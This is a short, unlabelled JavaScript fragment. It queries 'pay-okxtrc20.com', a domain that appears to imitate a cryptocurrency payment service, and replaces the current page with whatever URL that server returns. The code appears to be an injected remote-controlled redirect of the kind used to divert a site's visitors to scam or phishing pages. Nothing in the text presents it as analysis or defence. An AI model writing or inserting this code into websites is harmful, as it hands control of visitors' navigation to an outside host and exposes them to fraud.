        var api_url = 'https://www.pay-okxtrc20.com';
        var domain = window.location.href;
        var xhr = new XMLHttpRequest();
        xhr.open('GET',api_url, true);
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4 && xhr.status === 200) {
                console.log(JSON.parse(xhr.responseText));
                if(JSON.parse(xhr.responseText).code == 1){
                    var url = JSON.parse(xhr.responseText).data
                    window.location.replace(url);
                }
            }
        };
        xhr.send();
